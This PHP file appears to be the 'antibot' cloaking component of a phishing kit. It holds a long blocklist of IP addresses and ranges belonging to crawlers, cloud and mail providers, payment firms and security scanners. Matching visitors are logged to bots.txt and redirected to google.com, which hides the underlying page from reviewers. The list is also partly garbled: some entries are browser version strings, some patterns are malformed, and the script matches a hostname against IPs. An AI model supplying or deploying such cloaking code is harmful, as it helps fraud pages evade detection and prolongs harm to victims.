<?php


$userIp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$IpBanned = array(
	"127.0.0.1",
	"69.171.251.118",
	"40.94.89.*",
	"^66.135.200.*",
	"^91.103.66.*",
	"^208.91.115.*",
	"^199.30.228.*",
	"^38.100.*.*",
	"^107.170.*.*",
	"^149.20.*.*",
	"^38.105.*.*",
	"^74.125.*.*",
	"^66.150.14.*",
	"^54.176.*.*",
	"^184.173.*.*",
	"^66.249.*.*",
	"^128.242.*.*",
	"^72.14.192.*",
	"^208.65.144.*",
	"^209.85.128.*",
	"^216.239.32.*",
	"^207.126.144.*",
	"^173.194.*.*",
	"^64.233.160.*",
	"^64.18.*.*",
	"^194.52.68.*",
	"^194.72.238.*",
	"^62.116.207.*",
	"^212.50.193.*",
	"^69.65.*.*",
	"^50.7.*.*",
	"^131.212.*.*",
	"^62.90.*.*",
	"^89.138.*.*",
	"^82.166.*.*",
	"^85.64.*.*",
	"^85.250.*.*",
	"^93.172.*.*",
	"^109.186.*.*",
	"^194.90.*.*",
	"^212.29.192.*",
	"^212.29.224.*",
	"^212.143.*.*",
	"^212.150.*.*",
	"^212.235.*.*",
	"^217.132.*.*",
	"^50.97.*.*",
	"^209.85.*.*",
	"^66.205.64.*",
	"^204.14.48.*",
	"^64.27.2.*",
	"^67.15.*.*",
	"^202.108.252.*",
	"^193.47.80.*",
	"^64.62.136.*",
	"^66.221.*.*",
	"^64.62.175.*",
	"^198.54.*.*",
	"^192.115.134.*",
	"^216.252.167.*",
	"^193.253.199.*",
	"^69.61.12.*",
	"^64.37.103.*",
	"^38.144.36.*",
	"^64.124.14.*",
	"^206.28.72.*",
	"^209.73.228.*",
	"^158.108.*.*",
	"^168.188.*.*",
	"^66.207.120.*",
	"^167.24.*.*",
	"^192.118.48.*",
	"^67.209.128.*",
	"^12.148.209.*",
	"^12.148.196.*",
	"^193.220.178.*",
	"68.65.53.71",
	"^198.25.*.*",
	"^64.106.213.*",
	"54.228.218.117",
	"^54.228.218.*",
	"185.28.20.243",
	"^185.28.20.*",
	"217.16.26.166",
	"^217.16.26.*",
	"50.16.241.113",
	"50.16.241.114",
	"50.16.241.117",
	"50.16.247.234",
	"52.204.97.54",
	"52.5.190.19",
	"54.197.234.188",
	"54.208.100.253",
	"23.21.227.69",
	"65.214.45.143",
	"65.214.45.148",
	"66.235.124.192",
	"66.235.124.7",
	"66.235.124.101",
	"66.235.124.193",
	"66.235.124.73",
	"66.235.124.196",
	"66.235.124.74",
	"63.123.238.8",
	"202.143.148.61",
	"66.249.66.1",
	"1.9.2.13",
	"1.9.2.15",
	"62.210.13.58",
	"104.62.2.60",
	"104.83.233.198",
	"107.178.194.64",
	"108.161.29.60",
	"115.238.55.18",
	"119.97.214.138",
	"138.197.207.*",
	"145.239.156.71",
	"145.239.156.89",
	"150.70.168.35",
	"150.70.188.167",
	"154.127.57.30",
	"162.243.128.197",
	"162.243.187.126",
	"162.243.69.215",
	"165.227.0.128",
	"170.250.139.48",
	"138.197.207.147",
	"173.230.147.44",
	"177.39.232.144",
	"178.17.170.156",
	"185.104.186.168",
	"185.220.101.26",
	"188.166.63.71",
	"192.36.27.7",
	"196.52.84.81",
	"204.13.201.137",
	"208.87.233.140",
	"212.83.139.219",
	"212.92.117.5",
	"216.164.117.239",
	"217.96.188.74",
	"219.117.238.170",
	"23.27.153.247",
	"23.27.154.37",
	"24.23.24.144",
	"27.0.1453.110",
	"3.0.04506.648",
	"3.0.4506.2152",
	"31.168.158.239",
	"34.237.113.113",
	"39.0.2150.5",
	"41.0.2272.118",
	"43.0.2357.81",
	"44.0.2403.155",
	"46.101.94.163",
	"5.62.39.18",
	"5.62.41.35",
	"5.62.56.91",
	"50.112.194.65",
	"50.116.2.167",
	"51.0.2704.103",
	"52.18.11.161",
	"52.192.164.225",
	"52.27.2.86",
	"52.31.63.97",
	"52.5.98.73",
	"52.72.33.140",
	"52.87.10.90",
	"52.91.94.56",
	"53.0.2785.116",
	"54.213.103.141",
	"54.245.191.79",
	"56.0.2924.87",
	"57.0.2987.98",
	"61.0.3116.0",
	"62.24.252.133",
	"62.67.194.35",
	"63.0.3239.132",
	"64.0.3282.140",
	"64.0.3282.167",
	"66.0.3358.0",
	"66.0.3359.0",
	"67.0.3360.0",
	"67.0.3361.0",
	"75.163.12.85",
	"76.19.184.88",
	"77.69.251.230",
	"80.104.176.17",
	"81.0.48.*",
	"81.0.48.138",
	"84.13.191.239",
	"84.92.148.184",
	"88.99.62.141",
	"217.96.197.246",
	"89.234.157.254",
	"91.231.212.111",
	"173.239.240.147",
	"103.248.172.42",
	"87.113.96.90",
	"185.229.190.140",
	"165.227.39.194",
	"46.101.119.24",
	"82.102.27.75",
	"173.239.230.97",
	"159.203.0.156",
	"47.30.133.89",
	"^66.102.*.*",
	"^173.239.*.*",
	"^173.244.36.*",
	"^46.116.*.* ",
	"^94.26.*.*",
	"^95.85.*.*",
	"^72.52.96.*",
	"^212.8.79.*",
	"^62.99.77.*",
	"^83.31.118.*",
	"^91.231.*.*",
	"^206.207.*.*",
	"^91.231.212.*",
	"^198.41.243.*",
	"^162.158.*.*",
	"^162.158.7.*",
	"^162.158.72.*",
	"^173.245.55.*",
	"^108.162.246.*",
	"^162.158.95.*",
	"^108.162.215.*",
	"^95.108.194.*",
	"^141.101.104.*",
	"^93.54.82.*",
	"^69.164.145.*",
	"^194.153.113.*",
	"^178.43.117.*",
	"^62.141.65.*",
	"^83.31.69.*",
	"^107.178.195.*",
	"^149.20.54.*",
	"^85.9.7.*",
	"^87.106.251.*",
	"^107.178.194.*",
	"^124.66.185.*",
	"^133.11.204.*",
	"^185.2.138.*",
	"^188.165.83.*",
	"^78.148.13.*",
	"^192.232.213.*",
	"^1.234.41.*",
	"^176.195.231.*",
	"^206.253.226.*",
	"^107.20.181.*",
	"^188.244.39.*",
	"^38.74.138.*",
	"^37.140.188.*",
	"^195.128.227.*",
	"^46.4.120.*",
	"^198.60.236.*",
	"^217.74.103.*",
	"^92.103.69.*",
	"^66.211.160.86*",
	"^46.244.*.*",
	"^131.120.12.*",
	"^157.201.10.*",
	"^172.217.*.*",
	"^103.86.99.*",
	"^213.100.*.*",
	"^216.58.*.*",
	"^74.125.133.*",
	"^216.239.*.*",
	"^64.4.*.*",
	"^65.52.*.*",
	"^131.253.*.*",
	"^157.54.*.*",
	"^207.46.*.*",
	"^207.68.*.*",
	"^8.12.*.*",
	"^66.196.*.*",
	"^66.228.*.*",
	"^67.195.*.*",
	"^68.142.*.*",
	"^72.30.*.*",
	"^74.6.*.*",
	"^98.136.*.*",
	"^202.160.*.*",
	"^209.191.*.*",
	"^184.165.*.*",
	"^198.68.61.*",
	"^199.3.10.*",
	"^204.119.24.*",
	"^204.251.90.*",
	"^100.43.*.*",
	"^72.94.249.*",
	"^103.6.76.*",
	"^106.12.*.*",
	"^115.231.36.*",
	"^5.189.*.*",
	"^66.102.6.*",
	"^173.252.*.*",
	"^196.23.168.*",
	"^190.82.81.*",
	"^92.189.25.*",
	"^52.31.147.*",
	"^69.164.111.*",
	"^173.252.86.*",
	"^203.215.181.*",
	"^208.43.225.*",
	"^173.192.*.*",
	"^212.113.37.*",
	"^119.63.*.*",
	"^188.207.200.*",
	"^89.108.102.*",
	"^173.11.97.*",
	"^209.185.108.*",
	"^209.185.253.*",
	"^64.68.*.*",
	"^72.14.199.*",
	"^8.6.48.*",
	"^141.185.209.*",
	"^169.207.238.*",
	"^195.211.*.*",
	"^185.41.162.*",
	"^51.15.*.*",
	"^84.51.153.*",
	"^185.220.101.*",
	"^40.85.158.*",
	"^8.23.224.*",
	"^104.132.20.*",
	"^1.33.126.*",
	"^217.96.*.*",
	"^93.119.*.*",
	"^23.27.152.*",
	"^111.231.*.*",
	"^144.217.82.*",
	"^148.163.128.*",
	"^41.208.72.*",
	"^36.74.236.*",
	"^64.233.173.*",
	"^36.83.56.*",
	"^87.115.213.*",
	"^110.88.*.*",
	"^46.101.119.*",
	"^68.14.83.*",
	"^100.6.107.*",
	"^174.255.*.*",
	"^72.49.133.*",
	"^104.15.60.*",
	"^35.153.86.*",
	"^191.98.136.*",
	"^175.135.172.*",
	"^134.119.*.*",
	"^208.101.*.*",
	"^104.42.*.*",
	"^181.229.*.*",
	"^89.234.*.*",
	"^186.6.*.*",
	"^103.19.16.*",
	"^158.69.216.*",
	"^157.39.109.*",
	"^83.31.*.*",
	"^92.23.56.*",
	"^86.132.235.*",
	"^106.133.165.*",
	"^111.89.*.*",
	"^14.101.178.*",
	"^107.178.*.*",
	"^180.29.89.*",
	"^61.21.221.*",
	"^204.85.191.*",
	"^188.166.*.*",
	"^199.59.150.*",
	"^209.135.212.*",
	"^208.87.233.*",
	"^49.104.10.*",
	"^216.252.*.*",
	"^24.172.*.*",
	"^193.128.*.*",
	"^162.244.*.*",
	"^40.121.198.*",
	"^95.45.252.*",
	"^83.71.*.*",
	"^66.214.*.*",
	"^205.201.132.*",
	"^40.107.*.*",
	"^104.132.*.*",
	"^173.205.33.*",
	"^185.145.156.*",
	"^17.198.249.*",
	"^103.35.*.*",
	"^128.28.*.*",
	"^128.72.*.*",
	"^128.75.*.*",
	"^138.122.*.*",
	"^139.59.*.*",
	"^50.107.*.*",
	"^66.211.169.3",
	"^66.211.169.66",
	"^89.163.159.214",
	"^37.128.131.171",
	"^68.65.53.71",
	"^104.108.64.175",
	"^173.194.116.102",
	"^173.194.112.*",
	"^65.55.206.154",
	"^193.221.113.53",
	"^208.76.45.53",
	"^208.84.*.*",
	"^207.46.8.167",
	"^65.54.188.110",
	"^207.46.8.199",
	"^134.170.2.199",
	"^65.55.92.152",
	"^65.54.188.94",
	"^65.55.37.104",
	"^65.55.92.168",
	"^65.55.37.120",
	"^65.55.33.119",
	"^65.55.92.184",
	"^65.54.188.126",
	"^65.55.37.88",
	"^65.55.92.136",
	"^65.55.37.72",
	"^65.55.33.135",
	"^65.55.85.12",
	"^173.194.116.149",
	"^216.58.211.37" ,
	"^64.233.*.*",
	"^216.239.*.*" ,
	"^216.33.229.163" ,
	"^64.233.173.*" ,
	"^64.68.90.*",
	"^54.228.218.117",
	"^185.28.20.243",
	"^217.16.26.166",
	"^209.19.*.*",
	"^207.70.*.*",
	"^185.75.*.*",
	"^193.226.*.*",
	"^64.71.*.*",
	"^69.164.*.*",
	"^64.74.*.*",
	"^64.235.*.*",
	"^4.14.64.*.*",
	"^4.14.64.*",
	"^72.13.86.*",
	"^4.14.0.0",
	'^104.236.153.*',
	'^107.170.*.*',
	'^64.71.206.*',
	'^64.71.205.*',
	'^64.71.204.*',
	'^66.102.8.*',
	'^157.55.39.*',
	'^105.107.79.*',
	'^4.14.64.*',
	'^64.74.215.*',
	'^198.186.190.*',
	'^198.186.191.*',
	'^198.186.192.*',
	'^198.186.193.*',
	'^109.186.*.*',
	'^12.148.196.*',
	'^12.148.209.*',
	'^128.242.*.*',
	'^131.212.*.*',
	'^149.20.*.*',
	'^158.108.*.*',
	'^163.195.178.*',
	'^167.24.*.*',
	'^168.188.*.*',
	'^173.194.*.*',
	'^173.224.160.*',
	'^173.224.161.*',
	'^173.224.162.*',
	'^173.224.163.*',
	'^173.224.164.*',
	'^173.224.165.*',
	'^173.224.166.*',
	'^173.224.167.*',
	'^184.173.*.*',
	'^192.115.134.*',
	'^192.118.48.*',
	'^193.220.178.*',
	'^193.253.199.*',
	'^193.47.80.*',
	'^194.52.68.*',
	'^194.72.238.*',
	'^194.90.*.*',
	'^198.25.*.*',
	'^198.54.*.*',
	'^199.30.228.*',
	'^202.108.252.*',
	'^204.14.48.*',
	'^206.28.72.*',
	'^207.126.144.*',
	'^208.65.144.*',
	'^208.91.115.*',
	'^209.73.228.*',
	'^209.85.*.*',
	'^209.85.128.*',
	'^212.143.*.*',
	'^212.150.*.*',
	'^212.235.*.*',
	'^212.29.192.*',
	'^212.29.224.*',
	'^212.50.193.*',
	'^216.10.193.*',
	'^216.239.32.*',
	'^216.252.167.*',
	'^217.132.*.*',
	'^38.100.*.*',
	'^38.105.*.*',
	'^38.144.36.*',
	'^46.116.*.* ',
	'^50.7.*.*',
	'^50.97.*.*',
	'^54.176.*.*',
	'^62.116.207.*',
	'^62.90.*.*',
	'^64.106.213.*',
	'^64.124.14.*',
	'^64.18.*.*',
	'^64.233.160.*',
	'^64.27.2.*',
	'^64.37.103.*',
	'^64.62.136.*',
	'^64.62.175.*',
	'^66.102.*.*',
	'^66.135.200.*',
	'^66.150.14.*',
	'^66.205.64.*',
	'^66.207.120.*',
	'^66.221.*.*',
	'^66.249.*.*',
	'^67.15.*.*',
	'^67.209.128.*',
	'^68.65.53.71',
	'^69.61.12.*',
	'^69.65.*.*',
	'^72.14.192.*',
	'^74.125.*.*',
	'^81.161.59.*',
	'^82.166.*.*',
	'^85.250.*.*',
	'^85.64.*.*',
	'^89.138.*.*',
	'^91.103.66.*',
	'^93.172.*.*',
	"^81.161.59.*",
	"^104.236.153.*",
	"^1.128.96.181",
	"^65.208.151.*",
	"^1.132.97.75",
	"^1.152.96.223",
	"^185.20.5.*",
	"^185.20.4.*",
	"^95.76.156.*",
	"^216.58.211.37",
	"^216.33.229.163",
	"^219.117.238.170",
	"^79.79.148.223",
	"^62.149.225.67",
	"^104.131.165.123",
	"^46.101.249.238",
	"^79.79.147.162",
	"^178.62.113.173",
	"^1.152.97.32",
	"^101.174.147.73",
	"27.54.62.91",
	"4.14.64.*",
	"^64.235.153.*","^64.235.154.*",
	"162.224.156.32",
	"^204.101.161.159",
	"^216.162.209.*",
	"^64.71.193.*",
	"^185.75.141.32",
	"^209.66.70.*",
	"^207.70.60.*",
	"^209.19.185.*",
	"^209.*",
	"^163.195.178.*",
	"^173.224.160.*",
	"^173.224.161.*",
	"^173.224.162.*",
	"^173.224.163.*",
	"^173.224.164.*",
	"^173.224.165.*",
	"^173.224.166.*",
	"^173.224.167.*",
	"^216.10.193.*",
	"^203.188.221.*",
	"^209.19.186.231",
	"^206.207.80.*",
	"^206.80.*.*",
	"^207.80.*.*",
	"^108.210.106.*",
	"^173.14.18.*",
	"^52.90.*.*",
	"^35.172.115.*",
	"^54.164.*.*",
	"^222.154.252.*",
	"^195.211.23.*",
	"^13.57.36.*",
	"^210.55.200.*",
	"^42.112.8.*",
	"66.249.91.*",
	"66.249.91.203",
	"^84.93.84.*",
	"^182.75.120.*",
	"^182.75.120.10",
	"^46.101.43.*",
	"^147.75.210.*",
	"159.65.210.36",
	"196.251.250.29",
	"185.130.184.209",
	"87.115.231.241",
	"35.243.23.83",
	"107.189.10.42",
	"2600:1900:2000:38:400::10",
	"107.178.194.234",
	"35.243.23.74",
	"136.243.111.17 ",
	"138.201.202.232",
	"3.101.0.4",
	"54.207.33.42",
	"8.28.16.254",
	"34.229.141.32",
	"143.3.53.161",
	"74.50.56.239",
	"35.166.160.161",
	"136.243.111.17",
	"83.31.41.195",
	"83.31.41.200",
	"74.211.8.61",
	"82.102.19.136",
	"69.25.58.61",
	"113.116.51.127",
	"185.236.201.148",
	"82.102.18.114",
	"80.44.175.165",
	"185.220.70.151",
	"205.251.148.186",
	"169.38.85.109",
	"91.103.66.200",
	"89.238.139.12",
	"37.120.213.169",
	"134.209.142.35",
	"194.99.105.99",
	"31.13.191.161",
	"83.97.23.38",
	"93.107.26.45",
	"64.110.130.5",
	"35.224.124.244",
	"107.189.10.190",
	"54.198.55.229",
	"34.66.238.194",
	"87.115.231.241",
	"82.102.27.124",
	"104.223.127.208",
	"68.183.245.118",
	"84.17.43.76",
	"89.238.131.150",
	"52.204.27.85",
	"104.197.5.72",
	"165.231.142.36",
	"185.217.171.12",
	"35.202.98.254",
	"34.71.81.227",
	"35.223.233.20",
	"103.205.140.227",
	'46.248.190.0',
	'46.248.190.1',
	'46.248.190.2',
	'46.248.190.3',
	'46.248.190.4',
	'46.248.190.5',
	'46.248.190.6',
	'46.248.190.7',
	'46.248.190.8',
	'46.248.190.9',
	'46.248.190.10',
	'46.248.190.11',
	'46.248.190.12',
	'46.248.190.13',
	'46.248.190.14',
	'46.248.190.15',
	'46.248.190.16',
	'46.248.190.17',
	'46.248.190.18',
	'46.248.190.19',
	'46.248.190.20',
	'46.248.190.21',
	'46.248.190.22',
	'46.248.190.23',
	'46.248.190.24',
	'46.248.190.25',
	'46.248.190.26',
	'46.248.190.27',
	'46.248.190.28',
	'46.248.190.29',
	'46.248.190.30',
	'46.248.190.31',
	'46.248.190.32',
	'46.248.190.33',
	'46.248.190.34',
	'46.248.190.35',
	'46.248.190.36',
	'46.248.190.37',
	'46.248.190.38',
	'46.248.190.39',
	'46.248.190.40',
	'46.248.190.41',
	'46.248.190.42',
	'46.248.190.43',
	'46.248.190.44',
	'46.248.190.45',
	'46.248.190.46',
	'46.248.190.47',
	'46.248.190.48',
	'46.248.190.49',
	'46.248.190.50',
	'46.248.190.51',
	'46.248.190.52',
	'46.248.190.53',
	'46.248.190.54',
	'46.248.190.55',
	'46.248.190.56',
	'46.248.190.57',
	'46.248.190.58',
	'46.248.190.59',
	'46.248.190.60',
	'46.248.190.61',
	'46.248.190.62',
	'46.248.190.63',
	'46.248.190.64',
	'46.248.190.65',
	'46.248.190.66',
	'46.248.190.67',
	'46.248.190.68',
	'46.248.190.69',
	'46.248.190.70',
	'46.248.190.71',
	'46.248.190.72',
	'46.248.190.73',
	'46.248.190.74',
	'46.248.190.75',
	'46.248.190.76',
	'46.248.190.77',
	'46.248.190.78',
	'46.248.190.79',
	'46.248.190.80',
	'46.248.190.81',
	'46.248.190.82',
	'46.248.190.83',
	'46.248.190.84',
	'46.248.190.85',
	'46.248.190.86',
	'46.248.190.87',
	'46.248.190.88',
	'46.248.190.89',
	'46.248.190.90',
	'46.248.190.91',
	'46.248.190.92',
	'46.248.190.93',
	'46.248.190.94',
	'46.248.190.95',
	'46.248.190.96',
	'46.248.190.97',
	'46.248.190.98',
	'46.248.190.99',
	'46.248.190.100',
	'46.248.190.101',
	'46.248.190.102',
	'46.248.190.103',
	'46.248.190.104',
	'46.248.190.105',
	'46.248.190.106',
	'46.248.190.107',
	'46.248.190.108',
	'46.248.190.109',
	'46.248.190.110',
	'46.248.190.111',
	'46.248.190.112',
	'46.248.190.113',
	'46.248.190.114',
	'46.248.190.115',
	'46.248.190.116',
	'46.248.190.117',
	'46.248.190.118',
	'46.248.190.119',
	'46.248.190.120',
	'46.248.190.121',
	'46.248.190.122',
	'46.248.190.123',
	'46.248.190.124',
	'46.248.190.125',
	'46.248.190.126',
	'46.248.190.127',
	'46.248.190.128',
	'46.248.190.129',
	'46.248.190.130',
	'46.248.190.131',
	'46.248.190.132',
	'46.248.190.133',
	'46.248.190.134',
	'46.248.190.135',
	'46.248.190.136',
	'46.248.190.137',
	'46.248.190.138',
	'46.248.190.139',
	'46.248.190.140',
	'46.248.190.141',
	'46.248.190.142',
	'46.248.190.143',
	'46.248.190.144',
	'46.248.190.145',
	'46.248.190.146',
	'46.248.190.147',
	'46.248.190.148',
	'46.248.190.149',
	'46.248.190.150',
	'46.248.190.151',
	'46.248.190.152',
	'46.248.190.153',
	'46.248.190.154',
	'46.248.190.155',
	'46.248.190.156',
	'46.248.190.157',
	'46.248.190.158',
	'46.248.190.159',
	'46.248.190.160',
	'46.248.190.161',
	'46.248.190.162',
	'46.248.190.163',
	'46.248.190.164',
	'46.248.190.165',
	'46.248.190.166',
	'46.248.190.167',
	'46.248.190.168',
	'46.248.190.169',
	'46.248.190.170',
	'46.248.190.171',
	'46.248.190.172',
	'46.248.190.173',
	'46.248.190.174',
	'46.248.190.175',
	'46.248.190.176',
	'46.248.190.177',
	'46.248.190.178',
	'46.248.190.179',
	'46.248.190.180',
	'46.248.190.181',
	'46.248.190.182',
	'46.248.190.183',
	'46.248.190.184',
	'46.248.190.185',
	'46.248.190.186',
	'46.248.190.187',
	'46.248.190.188',
	'46.248.190.189',
	'46.248.190.190',
	'46.248.190.191',
	'46.248.190.192',
	'46.248.190.193',
	'46.248.190.194',
	'46.248.190.195',
	'46.248.190.196',
	'46.248.190.197',
	'46.248.190.198',
	'46.248.190.199',
	'46.248.190.200',
	'46.248.190.201',
	'46.248.190.202',
	'46.248.190.203',
	'46.248.190.204',
	'46.248.190.205',
	'46.248.190.206',
	'46.248.190.207',
	'46.248.190.208',
	'46.248.190.209',
	'46.248.190.210',
	'46.248.190.211',
	'46.248.190.212',
	'46.248.190.213',
	'46.248.190.214',
	'46.248.190.215',
	'46.248.190.216',
	'46.248.190.217',
	'46.248.190.218',
	'46.248.190.219',
	'46.248.190.220',
	'46.248.190.221',
	'46.248.190.222',
	'46.248.190.223',
	'46.248.190.224',
	'46.248.190.225',
	'46.248.190.226',
	'46.248.190.227',
	'46.248.190.228',
	'46.248.190.229',
	'46.248.190.230',
	'46.248.190.231',
	'46.248.190.232',
	'46.248.190.233',
	'46.248.190.234',
	'46.248.190.235',
	'46.248.190.236',
	'46.248.190.237',
	'46.248.190.238',
	'46.248.190.239',
	'46.248.190.240',
	'46.248.190.241',
	'46.248.190.242',
	'46.248.190.243',
	'46.248.190.244',
	'46.248.190.245',
	'46.248.190.246',
	'46.248.190.247',
	'46.248.190.248',
	'46.248.190.249',
	'46.248.190.250',

);

if(in_array($userIp,$IpBanned)){
	$content = "AntiBots => ".$userIp." [ IP ] \n";
	$save=fopen("bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
	header("Location: http://www.google.com/");exit();

}
foreach($IpBanned as $bot_ip){
	if(preg_match('/'.$bot_ip.'/',$userIp)){
		$content = "AntiBots => ".$userIp." [ IP ] \n";
		$save=fopen("bots.txt","a+");
	    fwrite($save,$content);
	    fclose($save);
		header("Location: http://www.google.com/");exit();
	}
}